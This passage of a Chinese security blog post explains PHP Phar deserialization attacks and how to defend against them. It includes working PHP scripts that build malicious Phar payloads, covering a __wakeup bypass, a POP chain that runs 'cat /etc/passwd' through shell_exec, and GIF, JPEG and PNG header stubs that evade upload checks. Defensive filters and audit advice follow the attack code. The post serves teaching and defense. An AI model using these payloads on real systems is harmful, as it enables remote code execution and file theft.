+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 正常 — 触发 __wakeup()</span><br><span class="line">O:8:&quot;MyClass&quot;:1:&#123;s:3:&quot;cmd&quot;;s:2:&quot;id&quot;;&#125;   // 属性计数1 = 实际1</span><br><span class="line"></span><br><span class="line">// 绕过 — 跳过 __wakeup()</span><br><span class="line">O:8:&quot;MyClass&quot;:2:&#123;s:3:&quot;cmd&quot;;s:2:&quot;id&quot;;&#125;   // 属性计数2 &gt; 实际1</span><br></pre></td></tr></table></figure>
+
+<h3 id="在Phar中的应用"><a href="#在Phar中的应用" class="headerlink" title="在Phar中的应用"></a>在Phar中的应用</h3><p>生成Phar后手工修改metadata中的序列化属性计数，然后重新计算签名：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dangerous</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&#x27;safe&#x27;</span>;  <span class="comment">// __wakeup防御：重置危险属性</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成Phar</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;payload.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;x.txt&#x27;</span>, <span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="keyword">new</span> <span class="title class_">Dangerous</span>());</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读二进制，修改属性计数值</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;payload.phar&#x27;</span>);</span><br><span class="line"><span class="comment">// Dangerous序列化: O:10:&quot;Dangerous&quot;:1:&#123;...&#125;</span></span><br><span class="line"><span class="comment">// 将1改为2</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(</span><br><span class="line">    <span class="string">&#x27;O:10:&quot;Dangerous&quot;:1:&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O:10:&quot;Dangerous&quot;:2:&#x27;</span>,</span><br><span class="line">    <span class="variable">$data</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：直接替换会破坏签名。更稳妥的做法是用Python脚本</span></span><br><span class="line"><span class="comment">// 精确解析Phar二进制格式后修改并重算SHA1签名。</span></span><br><span class="line"><span class="comment">// 推荐工具：phpggc -p phar -o payload.jpg GadgetChain command</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;payload-bypass.phar&#x27;</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="POP链实战示例"><a href="#POP链实战示例" class="headerlink" title="POP链实战示例"></a>POP链实战示例</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;obj; &#125;  <span class="comment">// 触发B::__toString()</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$this</span>-&gt;cmd); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造链：A::__destruct → echo B → B::__toString → shell_exec</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>(); <span class="variable">$b</span>-&gt;cmd = <span class="string">&#x27;cat /etc/passwd&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(); <span class="variable">$a</span>-&gt;obj = <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;pop.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;x.txt&#x27;</span>, <span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+
+<p>常见POP链起点：<code>__destruct()</code>、<code>__wakeup()</code>、<code>__toString()</code>、<code>__call()</code>、<code>__get()</code>、<code>__set()</code>。推荐使用<a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">phpggc</a>快速生成流行框架的现成利用链。</p>
+<h2 id="绕过技巧与坑点"><a href="#绕过技巧与坑点" class="headerlink" title="绕过技巧与坑点"></a>绕过技巧与坑点</h2><h3 id="1-图片头伪装有文件类型检测"><a href="#1-图片头伪装有文件类型检测" class="headerlink" title="1. 图片头伪装有文件类型检测"></a>1. 图片头伪装有文件类型检测</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);              <span class="comment">// GIF头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;\xFF\xD8\xFF\xE0&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);    <span class="comment">// JPEG头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;\x89\x50\x4E\x47\x0D\x0A\x1A\x0A&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">// PNG头</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-二次压缩破坏格式"><a href="#2-二次压缩破坏格式" class="headerlink" title="2. 二次压缩破坏格式"></a>2. 二次压缩破坏格式</h3><p>目标对上传文件进行缩略图生成、压缩等二次处理时，Phar二进制结构可能被破坏。需寻找不被二次处理的文件类型或上传目录。</p>
+<h3 id="3-phar-仅限本地"><a href="#3-phar-仅限本地" class="headerlink" title="3. phar:&#x2F;&#x2F;仅限本地"></a>3. phar:&#x2F;&#x2F;仅限本地</h3><p><code>phar://</code>只能操作本地文件系统，攻击者必须找到上传点将Phar落盘。</p>
+<h3 id="4-PHP配置影响"><a href="#4-PHP配置影响" class="headerlink" title="4. PHP配置影响"></a>4. PHP配置影响</h3><ul>
+<li><code>phar.readonly=On</code>：仅限制<strong>写入</strong>，不影响读取解析。本地生成Phar上传即可绕过。</li>
+<li><code>open_basedir</code>：限制可访问目录范围，但范围内的文件仍受影响。</li>
+</ul>
+<h3 id="5-getimagesize-双重利用"><a href="#5-getimagesize-双重利用" class="headerlink" title="5. getimagesize() 双重利用"></a>5. getimagesize() 双重利用</h3><p><code>getimagesize()</code>既被用于上传文件类型校验，又是触发Phar反序列化的函数。攻击者将Phar伪装为图片（使用图片头Stub）上传，目标调<code>getimagesize()</code>校验时就已触发攻击，后续<code>die(&#39;Invalid image&#39;)</code>不会执行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;avatar&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="comment">// ↑ 已触发反序列化！后续代码不再执行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$info</span> === <span class="literal">false</span>) &#123; <span class="keyword">die</span>(<span class="string">&#x27;Invalid image&#x27;</span>); &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-签名重算问题"><a href="#6-签名重算问题" class="headerlink" title="6. 签名重算问题"></a>6. 签名重算问题</h3><p>手工修改Phar二进制数据后，文件末尾的签名失效。Phar末尾结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Hash Value: 20/32/64 bytes][Signature Flag: 4 bytes][GBMB magic: 4 bytes]</span><br><span class="line">Signature Flag: 0x01=MD5, 0x02=SHA1, 0x04=SHA256, 0x08=SHA512</span><br></pre></td></tr></table></figure>
+
+<p>推荐使用phpggc等成熟Phar生成工具，避免手动操作引入签名错误。</p>
+<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><h3 id="1-过滤-phar-协议并限制文件路径"><a href="#1-过滤-phar-协议并限制文件路径" class="headerlink" title="1. 过滤 phar:&#x2F;&#x2F; 协议并限制文件路径"></a>1. 过滤 phar:&#x2F;&#x2F; 协议并限制文件路径</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_file_op</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 禁止 phar:// 协议</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(phar|zip|compress\.zlib|compress\.bzip2):\/\//i&#x27;</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Protocol not allowed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更根本的：不让用户控制完整文件路径</span></span><br><span class="line"><span class="variable">$user_file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$safe_path</span> = <span class="string">&#x27;/var/www/uploads/&#x27;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$user_file</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-检查文件内容并转写"><a href="#2-检查文件内容并转写" class="headerlink" title="2. 检查文件内容并转写"></a>2. 检查文件内容并转写</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检测 __HALT_COMPILER 标识</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>), <span class="string">&#x27;__HALT_COMPILER&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid file&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用GD库重写图片，彻底破坏Phar结构</span></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploaded_file</span>));</span><br><span class="line"><span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$img</span>, <span class="variable">$target_path</span> . <span class="string">&#x27;safe_&#x27;</span> . <span class="variable">$filename</span>, <span class="number">90</span>);</span><br><span class="line"><span class="title function_ invoke__">imagedestroy</span>(<span class="variable">$img</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-升级PHP版本"><a href="#3-升级PHP版本" class="headerlink" title="3. 升级PHP版本"></a>3. 升级PHP版本</h3><p>确保版本 &gt;&#x3D; 5.6.25 &#x2F; &gt;&#x3D; 7.0.10，修复CVE-2016-7124。注意PHP 8.0+中Phar反序列化仍然有效，升级不能根除。</p>
+<h3 id="4-代码审计要点"><a href="#4-代码审计要点" class="headerlink" title="4. 代码审计要点"></a>4. 代码审计要点</h3><ul>
+<li>审查所有文件操作函数的调用，确认路径是否用户可控。</li>
+<li>关注<code>file_exists</code>、<code>is_file</code>、<code>is_dir</code>、<code>filesize</code>等看似”只读”的函数。</li>
+<li>避免将用户输入直接拼接进文件路径，始终使用<code>basename()</code>或白名单校验。</li>
+<li>对上传文件做内容级别的检查和转写，而非仅扩展名校验。</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Phar反序列化是一种触发面广、隐蔽性强的攻击方式：</p>
+<ol>
+<li><strong>触发面广</strong>：几乎所有文件操作函数都可能成为入口。</li>
+<li><strong>隐蔽性强</strong>：攻击载荷可伪装为常见文件类型。</li>
+<li><strong>不依赖unserialize()</strong>：无需目标代码中存在显式反序列化调用。</li>
+<li><strong>可结合POP链</strong>：与框架（ThinkPHP、Laravel等）已有的POP链结合实现RCE。</li>
+</ol>
+<p>防御关键是限制用户对文件路径的控制、检查上传文件真实类型、对上传文件进行内容转写，并在代码审计中重点关注文件操作函数的安全性。</p>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文所述技术仅供安全研究和授权测试使用。任何未经授权的攻击行为均属违法，与作者无关。请读者在合法合规的前提下学习安全技术，共同提升网络安全防御水平。</p>
+<hr>
+<p><strong>参考资料：</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/book.phar.php">PHP Manual — Phar</a></li>
+<li><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=72663">CVE-2016-7124</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.ripstech.com/2018/new-php-exploitation-technique/">File Operation Induced Unserialization via phar:&#x2F;&#x2F; — Sam Thomas &#x2F; RIPS Tech</a></li>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">利用phar拓展PHP反序列化漏洞攻击面 — Seebug</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">phpggc — PHP Generic Gadget Chains</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Framework-Nacos-security/" rel="prev" title="Nacos安全测试">
+                  <i class="fa fa-angle-left"></i> Nacos安全测试
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Tools-BloodHound-AD/" rel="next" title="BloodHound AD攻击路径分析">
+                  BloodHound AD攻击路径分析 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
